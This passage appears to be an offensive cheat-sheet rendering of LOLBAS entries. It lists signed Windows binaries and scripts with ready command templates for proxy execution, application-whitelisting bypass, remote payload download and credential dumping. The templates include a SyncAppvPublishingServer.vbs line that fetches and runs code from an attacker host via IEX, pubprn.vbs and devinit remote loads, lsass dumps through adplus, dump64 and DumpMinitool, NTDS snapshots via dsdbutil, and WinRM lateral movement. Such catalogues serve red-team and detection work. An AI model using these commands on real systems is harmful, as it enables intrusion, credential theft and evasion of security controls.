rundll32.exe url.dll,FileProtocolHandler $file_out
```
<!-- cheat
var file_out
-->

### Url.dll Execute #5

Launch an executable by calling FileProtocolHandler.

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Launch an executable by calling FileProtocolHandler"
rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e
```
<!-- cheat
-->

### Url.dll Execute #6

Launch a HTML application payload by calling FileProtocolHandler.

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Launch a HTML application payload by calling FileProtocolHandler"
rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta
```
<!-- cheat
-->

## Zipfldr.dll

Compressed Folder library

**Path(s):**
- `c:\windows\system32\zipfldr.dll`
- `c:\windows\syswow64\zipfldr.dll`

### Zipfldr.dll Execute #1

Launch an executable payload by calling RouteTheCall.

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Launch an executable payload by calling RouteTheCall"
rundll32.exe zipfldr.dll,RouteTheCall $file_out
```
<!-- cheat
var file_out
-->

### Zipfldr.dll Execute #2

Launch an executable payload by calling RouteTheCall (obfuscated).

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Launch an executable payload by calling RouteTheCall (obfuscated)"
rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e
```
<!-- cheat
-->

# OS Scripts

## CL_Invocation.ps1

Aero diagnostics script

**Path(s):**
- `C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1`
- `C:\Windows\diagnostics\system\Audio\CL_Invocation.ps1`
- `C:\Windows\diagnostics\system\WindowsUpdate\CL_Invocation.ps1`

### CL_Invocation.ps1 Execute

Import the PowerShell Diagnostic CL_Invocation script and call SyncInvoke to launch an executable.

*Privileges: User • MITRE: T1216*

```cmd title:"Lolbas Import the PowerShell Diagnostic CL_Invocation script and call SyncInvoke to launch an executable"
. C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1   \nSyncInvoke $cmd
```
<!-- cheat
var cmd
-->

## CL_LoadAssembly.ps1

PowerShell Diagnostic Script

**Path(s):**
- `C:\Windows\diagnostics\system\Audio\CL_LoadAssembly.ps1`

### CL_LoadAssembly.ps1 Execute

Proxy execute Managed DLL with PowerShell

*Privileges: User • MITRE: T1216*

```cmd title:"Lolbas Proxy execute Managed DLL with PowerShell"
powershell.exe -ep bypass -command "set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\..\..\..\testing\fun.dll;[Program]::Fun()"
```
<!-- cheat
-->

## CL_Mutexverifiers.ps1

Proxy execution with CL_Mutexverifiers.ps1

**Path(s):**
- `C:\Windows\diagnostics\system\WindowsUpdate\CL_Mutexverifiers.ps1`
- `C:\Windows\diagnostics\system\Audio\CL_Mutexverifiers.ps1`
- `C:\Windows\diagnostics\system\WindowsUpdate\CL_Mutexverifiers.ps1`
- `C:\Windows\diagnostics\system\Video\CL_Mutexverifiers.ps1`
- `C:\Windows\diagnostics\system\Speech\CL_Mutexverifiers.ps1`

### CL_Mutexverifiers.ps1 Execute

Import the PowerShell Diagnostic CL_Mutexverifiers script and call runAfterCancelProcess to launch an executable.

*Privileges: User • MITRE: T1216*

```cmd title:"Lolbas CL_Mutexverifiers.ps1 Execute"
. C:\Windows\diagnostics\system\AERO\CL_Mutexverifiers.ps1   \nrunAfterCancelProcess $file_out
```
<!-- cheat
var file_out
-->

## Launch-VsDevShell.ps1

Locates and imports a Developer PowerShell module and calls the Enter-VsDevShell cmdlet

**Path(s):**
- `C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\Common7\Tools\Launch-VsDevShell.ps1`
- `C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\Tools\Launch-VsDevShell.ps1`

### Launch-VsDevShell.ps1 Execute #1

Execute binaries from the context of the signed script using the "VsWherePath" flag.

*Privileges: User • MITRE: T1216*

```cmd title:"Lolbas Execute binaries from the context of the signed script using the 'VsWherePath' flag"
powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsWherePath $file_out
```
<!-- cheat
var file_out
-->

### Launch-VsDevShell.ps1 Execute #2

Execute binaries and commands from the context of the signed script using the "VsInstallationPath" flag.

*Privileges: User • MITRE: T1216*

```cmd title:"Lolbas Launch-VsDevShell.ps1 Execute #2"
powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsInstallationPath "/../../../../../; $file_out ;"
```
<!-- cheat
var file_out
-->

## Manage-bde.wsf

Script for managing BitLocker

**Path(s):**
- `C:\Windows\System32\manage-bde.wsf`

### Manage-bde.wsf Execute #1

Set the comspec variable to another executable prior to calling manage-bde.wsf for execution.

*Privileges: User • MITRE: T1216*

```cmd title:"Lolbas Set the comspec variable to another executable prior to calling manage-bde.wsf for execution"
set comspec=$file_out & cscript c:\windows\system32\manage-bde.wsf
```
<!-- cheat
var file_out
-->

### Manage-bde.wsf Execute #2

Run the manage-bde.wsf script with a payload named manage-bde.exe in the same directory to run the payload file.

*Privileges: User • MITRE: T1216*

```cmd title:"Lolbas Manage-bde.wsf Execute #2"
copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf
```
<!-- cheat
-->

## Pester.bat

Used as part of the Powershell pester

**Path(s):**
- `c:\Program Files\WindowsPowerShell\Modules\Pester\<VERSION>\bin\Pester.bat`

### Pester.bat Execute #1

Execute code using Pester. The third parameter can be anything. The fourth is the payload.

*Privileges: User • MITRE: T1216*

```cmd title:"Lolbas Execute code using Pester. The third parameter can be anything. The fourth is the payload"
Pester.bat [/help|?|-?|/?] "$null; $cmd"
```
<!-- cheat
var cmd
-->

### Pester.bat Execute #2

Execute code using Pester. Example here executes specified executable.

*Privileges: User • MITRE: T1216*

```cmd title:"Lolbas Execute code using Pester. Example here executes specified executable"
Pester.bat ;$file_out
```
<!-- cheat
var file_out
-->

## Pubprn.vbs

Proxy execution with Pubprn.vbs

**Path(s):**
- `C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs`
- `C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs`

### Pubprn.vbs Execute

Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection

*Privileges: User • MITRE: T1216.001*

```cmd title:"Lolbas Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection"
pubprn.vbs $lhost script:$scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## Syncappvpublishingserver.vbs

Script used related to app-v and publishing server

**Path(s):**
- `C:\Windows\System32\SyncAppvPublishingServer.vbs`

### Syncappvpublishingserver.vbs Execute

Inject PowerShell script code with the provided arguments

*Privileges: User • MITRE: T1216.002*

```cmd title:"Lolbas Inject PowerShell script code with the provided arguments"
SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('$scheme://$lhost:$lport/$file') | IEX"
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## UtilityFunctions.ps1

PowerShell Diagnostic Script

**Path(s):**
- `C:\Windows\diagnostics\system\Networking\UtilityFunctions.ps1`

### UtilityFunctions.ps1 Execute

Proxy execute Managed DLL with PowerShell

*Privileges: User • MITRE: T1216*

```cmd title:"Lolbas Proxy execute Managed DLL with PowerShell"
powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[Program.Class]::Main()"
```
<!-- cheat
-->

## winrm.vbs

Script used for manage Windows RM settings

**Path(s):**
- `C:\Windows\System32\winrm.vbs`
- `C:\Windows\SysWOW64\winrm.vbs`

### winrm.vbs Execute #1

Lateral movement/Remote Command Execution via WMI Win32_Process class over the WinRM protocol

*Privileges: User • MITRE: T1216*

```cmd title:"Lolbas Lateral movement/Remote Command Execution via WMI Win32_Process class over the WinRM protocol"
winrm invoke Create wmicimv2/Win32_Process @$commandline_cmd -r:http://target:5985
```
<!-- cheat
var cmd
var commandline_cmd
-->

### winrm.vbs Execute #2

Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol

*Privileges: Admin • MITRE: T1216*

```cmd title:"Lolbas Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol"
winrm invoke Create wmicimv2/Win32_Service @$name_evil_displayname_evil_pathname_cmd -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985
```
<!-- cheat
var cmd
var name_evil_displayname_evil_pathname_cmd
-->

### winrm.vbs AWL Bypass #3

Bypass AWL solutions by copying cscript.exe to an attacker-controlled location; creating a malicious WsmPty.xsl in the same location, and executing winrm.vbs via the relocated cscript.exe.

*Privileges: User • MITRE: T1220*

```cmd title:"Lolbas winrm.vbs AWL Bypass #3"
%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty
```
<!-- cheat
-->

# Other MS Binaries

## AccCheckConsole.exe

Verifies UI accessibility requirements

**Path(s):**
- `C:\Program Files (x86)\Windows Kits\10\bin\10.0.22000.0\x86\AccChecker\AccCheckConsole.exe`
- `C:\Program Files (x86)\Windows Kits\10\bin\10.0.22000.0\x64\AccChecker\AccCheckConsole.exe`
- `C:\Program Files (x86)\Windows Kits\10\bin\10.0.22000.0\arm\AccChecker\AccCheckConsole.exe`
- `C:\Program Files (x86)\Windows Kits\10\bin\10.0.22000.0\arm64\AccChecker\AccCheckConsole.exe`

### AccCheckConsole.exe Execute #1

Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Load a managed DLL in the context of AccCheckConsole.exe"
AccCheckConsole.exe -window "Untitled - Notepad" $file_out
```
<!-- cheat
var file_out
-->

### AccCheckConsole.exe AWL Bypass #2

Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Load a managed DLL in the context of AccCheckConsole.exe"
AccCheckConsole.exe -window "Untitled - Notepad" $file_out
```
<!-- cheat
var file_out
-->

## adplus.exe

Debugging tool included with Windows Debugging Tools

**Path(s):**
- `C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\adplus.exe`
- `C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\adplus.exe`

### adplus.exe Dump #1

Creates a memory dump of the lsass process

*Privileges: SYSTEM • MITRE: T1003.001*

```cmd title:"Lolbas Creates a memory dump of the lsass process"
adplus.exe -hang -pn lsass.exe -o $dir -quiet
```
<!-- cheat
var dir
-->

### adplus.exe Execute #2

Execute arbitrary commands using adplus config file (see Resources section for a sample file).

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Execute arbitrary commands using adplus config file (see Resources section for a sample file)"
adplus.exe -c $file_out
```
<!-- cheat
var file_out
-->

### adplus.exe Dump #3

Dump process memory using adplus config file (see Resources section for a sample file).

*Privileges: SYSTEM • MITRE: T1003.001*

```cmd title:"Lolbas Dump process memory using adplus config file (see Resources section for a sample file)"
adplus.exe -c $file_out
```
<!-- cheat
var file_out
-->

### adplus.exe Execute #4

Execute arbitrary commands and binaries from the context of adplus. Note that providing an output directory via '-o' is required.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Execute arbitrary commands and binaries from the context of adplus"
adplus.exe -crash -o "$dir" -sc $file_out
```
<!-- cheat
var dir
var file_out
-->

## AgentExecutor.exe

Intune Management Extension included on Intune Managed Devices

**Path(s):**
- `C:\Program Files (x86)\Microsoft Intune Management Extension\AgentExecutor.exe`

### AgentExecutor.exe Execute #1

Spawns powershell.exe and executes a provided powershell script with ExecutionPolicy Bypass argument

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Spawns powershell.exe and executes a provided powershell script with ExecutionPolicy Bypass argument"
AgentExecutor.exe -powershell "$file_out" "$file_out" "$file_out" "$file_out" 60000 "C:\Windows\SysWOW64\WindowsPowerShell\v1.0" 0 1
```
<!-- cheat
var file_out
-->

### AgentExecutor.exe Execute #2

If we place a binary named powershell.exe in the specified folder path, agentexecutor.exe will execute it successfully

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas AgentExecutor.exe Execute #2"
AgentExecutor.exe -powershell "$file_out" "$file_out" "$file_out" "$file_out" 60000 "$dir" 0 1
```
<!-- cheat
var dir
var file_out
-->

## AppCert.exe

Windows App Certification Kit command-line tool.

**Path(s):**
- `C:\Program Files (x86)\Windows Kits\10\App Certification Kit\appcert.exe`
- `C:\Program Files\Windows Kits\10\App Certification Kit\appcert.exe`

### AppCert.exe Execute #1

Execute an executable file via the Windows App Certification Kit command-line tool.

*Privileges: Administrator • MITRE: T1127*

```cmd title:"Lolbas Execute an executable file via the Windows App Certification Kit command-line tool"
appcert.exe test -apptype desktop -setuppath $file_out -reportoutputpath $file_out
```
<!-- cheat
var file_out
-->

### AppCert.exe Execute #2

Install an MSI file via an msiexec instance spawned via appcert.exe as parent process.

*Privileges: Administrator • MITRE: T1218.007*

```cmd title:"Lolbas Install an MSI file via an msiexec instance spawned via appcert.exe as parent process"
appcert.exe test -apptype desktop -setuppath $file_out -setupcommandline /q -reportoutputpath $file_out
```
<!-- cheat
var file_out
-->

## AppLauncher.exe

User Experience Virtualization tool that launches applications under monitoring to capture and synchronize user settings.

**Path(s):**
- `C:\Program Files\Windows Kits\10\Microsoft User Experience Virtualization\Management\AppLauncher.exe`
- `C:\Program Files (x86)\Windows Kits\10\Microsoft User Experience Virtualization\Management\AppLauncher.exe`

### AppLauncher.exe Execute

Launches an executable via User Experience Virtualization tool.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Launches an executable via User Experience Virtualization tool"
AppLauncher.exe $file_out
```
<!-- cheat
var file_out
-->

## Appvlp.exe

Application Virtualization Utility Included with Microsoft Office 2016

**Path(s):**
- `C:\Program Files\Microsoft Office\root\client\appvlp.exe`
- `C:\Program Files (x86)\Microsoft Office\root\client\appvlp.exe`

### Appvlp.exe Execute #1

Executes .bat file through AppVLP.exe

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Executes .bat file through AppVLP.exe"
AppVLP.exe \\$lhost\$share\$file
```
<!-- cheat
import tun_ip
var file
var share
-->

### Appvlp.exe Execute #2

Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command"
AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('$file_out','', '', 'open', 1)"
```
<!-- cheat
var file_out
-->

## Bcp.exe

Microsoft SQL Server Bulk Copy Program utility for importing and exporting data between SQL Server instances and data files.

**Path(s):**
- `C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\bcp.exe`
- `C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\130\Tools\Binn\bcp.exe`
- `C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\110\Tools\Binn\bcp.exe`
- `C:\Program Files (x86)\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\bcp.exe`
- `C:\Program Files (x86)\Microsoft SQL Server\Client SDK\ODBC\130\Tools\Binn\bcp.exe`
- `C:\Program Files (x86)\Microsoft SQL Server\Client SDK\ODBC\110\Tools\Binn\bcp.exe`
- `C:\Program Files (x86)\Microsoft SQL Server\120\Tools\Binn\bcp.exe`

### Bcp.exe Download

Export binary payload stored in SQL Server database to file system.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Export binary payload stored in SQL Server database to file system"
bcp "SELECT payload_data FROM database.dbo.payloads WHERE id=1" queryout "C:\Windows\Temp\payload.exe" -S localhost -T -c
```
<!-- cheat
-->

## Bginfo.exe

Background Information Utility included with SysInternals Suite

**Path(s):**
- `no default`

### Bginfo.exe Execute #1

Execute VBscript code that is referenced within the specified .bgi file.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Execute VBscript code that is referenced within the specified .bgi file"
bginfo.exe $file_out /popup /nolicprompt
```
<!-- cheat
var file_out
-->

### Bginfo.exe AWL Bypass #2

Execute VBscript code that is referenced within the specified .bgi file.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Execute VBscript code that is referenced within the specified .bgi file"
bginfo.exe $file_out /popup /nolicprompt
```
<!-- cheat
var file_out
-->

### Bginfo.exe Execute #3

Execute bginfo.exe from a WebDAV server.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Execute bginfo.exe from a WebDAV server"
\\$lhost\webdav\bginfo.exe $file_out /popup /nolicprompt
```
<!-- cheat
import tun_ip
var file_out
-->

### Bginfo.exe AWL Bypass #4

Execute bginfo.exe from a WebDAV server.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Execute bginfo.exe from a WebDAV server"
\\$lhost\webdav\bginfo.exe $file_out /popup /nolicprompt
```
<!-- cheat
import tun_ip
var file_out
-->

### Bginfo.exe Execute #5

This style of execution may not longer work due to patch.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas This style of execution may not longer work due to patch"
\\live.sysinternals.com\Tools\bginfo.exe \\$lhost\$share\$file /popup /nolicprompt
```
<!-- cheat
import tun_ip
var file
var share
-->

### Bginfo.exe AWL Bypass #6

This style of execution may not longer work due to patch.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas This style of execution may not longer work due to patch"
\\live.sysinternals.com\Tools\bginfo.exe \\$lhost\$share\$file /popup /nolicprompt
```
<!-- cheat
import tun_ip
var file
var share
-->

## Cdb.exe

Debugging tool included with Windows Debugging Tools.

**Path(s):**
- `C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\cdb.exe`
- `C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\cdb.exe`

### Cdb.exe Execute #1

Launch 64-bit shellcode from the specified .wds file using cdb.exe.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Launch 64-bit shellcode from the specified .wds file using cdb.exe"
cdb.exe -cf $file_out -o notepad.exe
```
<!-- cheat
var file_out
-->

### Cdb.exe Execute #2

Attaching to any process and executing shell commands.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Attaching to any process and executing shell commands"
cdb.exe -pd -pn $process_name
.shell $cmd
```
<!-- cheat
var cmd
var process_name
-->

### Cdb.exe Execute #3

Execute arbitrary commands and binaries using a debugging script (see Resources section for a sample file).

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Execute commands with CDB debugging script"
cdb.exe -c $file_out "$cmd"
```
<!-- cheat
var cmd
var file_out
-->

## coregen.exe

Binary coregen.exe (Microsoft CoreCLR Native Image Generator) loads exported function GetCLRRuntimeHost from coreclr.dll or from .DLL in arbitrary path. Coregen is located within "C:\Program Files (x86)\Microsoft Silverlight\5.1.50918.0\" or another version of Silverlight. Coregen is signed by Microsoft and bundled with Microsoft Silverlight.

**Path(s):**
- `C:\Program Files\Microsoft Silverlight\5.1.50918.0\coregen.exe`
- `C:\Program Files (x86)\Microsoft Silverlight\5.1.50918.0\coregen.exe`

### coregen.exe Execute #1

Loads the target .DLL in arbitrary path specified with /L.

*Privileges: User • MITRE: T1055*

```cmd title:"Lolbas Loads the target .DLL in arbitrary path specified with /L"
coregen.exe /L $file_out dummy_assembly_name
```
<!-- cheat
var file_out
-->

### coregen.exe Execute #2

Loads the coreclr.dll in the corgen.exe directory (e.g. C:\Program Files\Microsoft Silverlight\5.1.50918.0).

*Privileges: User • MITRE: T1055*

```cmd title:"Lolbas Load coreclr.dll from coregen directory"
coregen.exe dummy_assembly_name
```
<!-- cheat
-->

### coregen.exe AWL Bypass #3

Loads the target .DLL in arbitrary path specified with /L. Since binary is signed it can also be used to bypass application whitelisting solutions.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Loads the target .DLL in arbitrary path specified with /L"
coregen.exe /L $file_out dummy_assembly_name
```
<!-- cheat
var file_out
-->

## Createdump.exe

Microsoft .NET Runtime Crash Dump Generator (included in .NET Core)

**Path(s):**
- `C:\Program Files\dotnet\shared\Microsoft.NETCore.App\<version>\createdump.exe`
- `C:\Program Files (x86)\dotnet\shared\Microsoft.NETCore.App\<version>\createdump.exe`
- `C:\Program Files\Microsoft Visual Studio\<version>\Community\dotnet\runtime\shared\Microsoft.NETCore.App\6.0.0\createdump.exe`
- `C:\Program Files (x86)\Microsoft Visual Studio\<version>\Community\dotnet\runtime\shared\Microsoft.NETCore.App\6.0.0\createdump.exe`

### Createdump.exe Dump

Dump process by PID and create a minidump file. If "-f dump.dmp" is not specified, the file is created as '%TEMP%\dump.%p.dmp' where %p is the PID of the target process.

*Privileges: SYSTEM • MITRE: T1003*

```cmd title:"Lolbas Dump process by PID and create a minidump file"
createdump.exe -n -f $file_out $pid
```
<!-- cheat
var file_out
var pid
-->

## csi.exe

Command line interface included with Visual Studio.

**Path(s):**
- `c:\Program Files (x86)\Microsoft Visual Studio\2017\Community\MSBuild\15.0\Bin\Roslyn\csi.exe`
- `c:\Program Files (x86)\Microsoft Web Tools\Packages\Microsoft.Net.Compilers.X.Y.Z\tools\csi.exe`

### csi.exe Execute

Use csi.exe to run unsigned C# code.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Use csi.exe to run unsigned C# code"
csi.exe $file_out
```
<!-- cheat
var file_out
-->

## DefaultPack.EXE

This binary can be downloaded along side multiple software downloads on the Microsoft website. It gets downloaded when the user forgets to uncheck the option to set Bing as the default search provider.

**Path(s):**
- `C:\Program Files (x86)\Microsoft\DefaultPack\DefaultPack.exe`

### DefaultPack.EXE Execute

Use DefaultPack.EXE to execute arbitrary binaries, with added argument support.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Use DefaultPack.EXE to execute arbitrary binaries, with added argument support"
DefaultPack.EXE /C:"$cmd"
```
<!-- cheat
var cmd
-->

## Devinit.exe

Visual Studio 2019 tool

**Path(s):**
- `C:\Program Files\Microsoft Visual Studio\<version>\Community\Common7\Tools\devinit\devinit.exe`
- `C:\Program Files (x86)\Microsoft Visual Studio\<version>\Community\Common7\Tools\devinit\devinit.exe`

### Devinit.exe Execute

Downloads an MSI file to C:\Windows\Installer and then installs it.

*Privileges: User • MITRE: T1218.007*

```cmd title:"Lolbas Downloads an MSI file to C:\Windows\Installer and then installs it"
devinit.exe run -t msi-install -i $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## Devtoolslauncher.exe

Binary will execute specified binary. Part of VS/VScode installation.

**Path(s):**
- `c:\windows\system32\devtoolslauncher.exe`

### Devtoolslauncher.exe Execute #1

The above binary will execute other binary.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas The above binary will execute other binary"
devtoolslauncher.exe LaunchForDeploy $file_out "$cmd" test
```
<!-- cheat
var cmd
var file_out
-->

### Devtoolslauncher.exe Execute #2

The above binary will execute other binary.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas The above binary will execute other binary"
devtoolslauncher.exe LaunchForDebug $file_out "$cmd" test
```
<!-- cheat
var cmd
var file_out
-->

## devtunnel.exe

Binary to enable forwarded ports on windows operating systems.

**Path(s):**
- `C:\Users\<username>\AppData\Local\Temp\.net\devtunnel\devtunnel.exe`
- `C:\Users\<username>\AppData\Local\Temp\DevTunnels\devtunnel.exe`

### devtunnel.exe Download

Enabling a forwarded port for locally hosted service at port 8080 to be exposed on the internet.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Enabling a forwarded port for locally hosted service at port 8080 to be exposed on the internet"
devtunnel.exe host -p 8080
```
<!-- cheat
-->

## dnx.exe

.NET Execution environment file included with .NET.

**Path(s):**
- `no default`

### dnx.exe Execute

Execute C# code located in the specified folder via 'Program.cs' and 'Project.json' (Note - Requires dependencies)

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Execute C# project with dnx"
dnx.exe $dir
```
<!-- cheat
var dir
-->

## Dotnet.exe

dotnet.exe comes with .NET Framework

**Path(s):**
- `C:\Program Files\dotnet\dotnet.exe`

### Dotnet.exe AWL Bypass #1

dotnet.exe will execute any DLL even if applocker is enabled.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas dotnet.exe will execute any DLL even if applocker is enabled"
dotnet.exe $file_out
```
<!-- cheat
var file_out
-->

### Dotnet.exe Execute #2

dotnet.exe will execute any DLL.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas dotnet.exe will execute any DLL"
dotnet.exe $file_out
```
<!-- cheat
var file_out
-->

### Dotnet.exe Execute #3

dotnet.exe will open a console which allows for the execution of arbitrary F# commands

*Privileges: User • MITRE: T1059*

```cmd title:"Lolbas dotnet.exe will open a console which allows for the execution of arbitrary F# commands"
dotnet.exe fsi
```
<!-- cheat
-->

### Dotnet.exe AWL Bypass #4

dotnet.exe with msbuild (SDK Version) will execute unsigned code

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas dotnet.exe with msbuild (SDK Version) will execute unsigned code"
dotnet.exe msbuild $file_out
```
<!-- cheat
var file_out
-->

## dsdbutil.exe

Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.

**Path(s):**
- `C:\Windows\System32\dsdbutil.exe`
- `C:\Windows\SysWOW64\dsdbutil.exe`

**Aliases:** `{'Alias': 'dsDbUtil.exe'}`

### dsdbutil.exe Dump #1

dsdbutil supports VSS snapshot creation

*Privileges: Administrator • MITRE: T1003.003*

```cmd title:"Lolbas dsdbutil supports VSS snapshot creation"
dsdbutil.exe "activate instance ntds" "snapshot" "create" "quit" "quit"
```
<!-- cheat
-->

### dsdbutil.exe Dump #2

Mounting the snapshot with its GUID

*Privileges: Administrator • MITRE: T1003.003*

```cmd title:"Lolbas Mounting the snapshot with its GUID"
dsdbutil.exe "activate instance ntds" "snapshot" "mount $guid" "quit" "quit"
```
<!-- cheat
var guid
-->

### dsdbutil.exe Dump #3

Deletes the mount of the snapshot

*Privileges: Administrator • MITRE: T1003.003*

```cmd title:"Lolbas Deletes the mount of the snapshot"
dsdbutil.exe "activate instance ntds" "snapshot" "delete $guid" "quit" "quit"
```
<!-- cheat
var guid
-->

### dsdbutil.exe Dump #4

Mounting with snapshot identifier

*Privileges: Administrator • MITRE: T1003.003*

```cmd title:"Lolbas Mounting with snapshot identifier"
dsdbutil.exe "activate instance ntds" "snapshot" "create" "list all" "mount 1" "quit" "quit"
```
<!-- cheat
-->

### dsdbutil.exe Dump #5

Deletes the mount of the snapshot

*Privileges: Administrator • MITRE: T1003.003*

```cmd title:"Lolbas Deletes the mount of the snapshot"
dsdbutil.exe "activate instance ntds" "snapshot" "list all" "delete 1" "quit" "quit"
```
<!-- cheat
-->

## dtutil.exe

Microsoft command line utility used to manage SQL Server Integration Services packages.

**Path(s):**
- `C:\Program Files\Microsoft SQL Server\<version>\DTS\Binn\dtutil.exe`
- `C:\Program Files (x86)\Microsoft SQL Server\<version>\DTS\Binn\dtutil.exe`

### dtutil.exe Copy

Copy file from source to destination

*Privileges: Administrator • MITRE: T1105*

```cmd title:"Lolbas Copy file from source to destination"
dtutil.exe /FILE $file_out /COPY FILE;$file_out
```
<!-- cheat
var file_out
-->

## Dump64.exe

Memory dump tool that comes with Microsoft Visual Studio

**Path(s):**
- `C:\Program Files (x86)\Microsoft Visual Studio\Installer\Feedback\dump64.exe`

### Dump64.exe Dump

Creates a memory dump of the LSASS process.

*Privileges: Administrator • MITRE: T1003.001*

```cmd title:"Lolbas Creates a memory dump of the LSASS process"
dump64.exe $pid out.dmp
```
<!-- cheat
var pid
-->

## DumpMinitool.exe

Dump tool part Visual Studio 2022

**Path(s):**
- `C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\Extensions\TestPlatform\Extensions\DumpMinitool.exe`

### DumpMinitool.exe Dump

Creates a memory dump of the lsass process

*Privileges: Administrator • MITRE: T1003.001*

```cmd title:"Lolbas Creates a memory dump of the lsass process"
DumpMinitool.exe --file $file_out --processId 1132 --dumpType Full
```
<!-- cheat
var file_out
-->

## Dxcap.exe

DirectX diagnostics/debugger included with Visual Studio.

**Path(s):**
- `C:\Windows\System32\dxcap.exe`
- `C:\Windows\SysWOW64\dxcap.exe`

### Dxcap.exe Execute #1

Launch specified executable as a subprocess of dxcap.exe. Note that you should have write permissions in the current working directory for the command to succeed; alternatively, add '-file c:\path\to\writable\location.ext' as first argument.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Launch specified executable as a subprocess of dxcap.exe"
Dxcap.exe -c $file_out
```
<!-- cheat
var file_out
-->

### Dxcap.exe Execute #2

Once executed, `dxcap.exe` will execute `xperf.exe` in the same folder. Thus, if `dxcap.exe` is copied to a folder and an arbitrary executable is renamed to `xperf.exe`, `dxcap.exe` will spawn it.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Once executed, dxcap.exe will execute xperf.exe in the same folder"
dxcap.exe -usage
```
<!-- cheat
-->

## ECMangen.exe

Command-line tool for managing certificates in Microsoft Exchange Server.

**Path(s):**
- `C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\Bin\ECMangen.exe`
- `C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\Bin\x64\ECMangen.exe`
- `C:\Program Files\Microsoft\Exchange Server\<version>\Bin\ECMangen.exe`
- `C:\Program Files\Microsoft\Exchange Server\Bin\ECMangen.exe`
- `C:\Program Files\Microsoft\Exchange Server\ClientAccess\Bin\ECMangen.exe`
- `C:\ExchangeServer\Bin\ECMangen.exe`

### ECMangen.exe Download

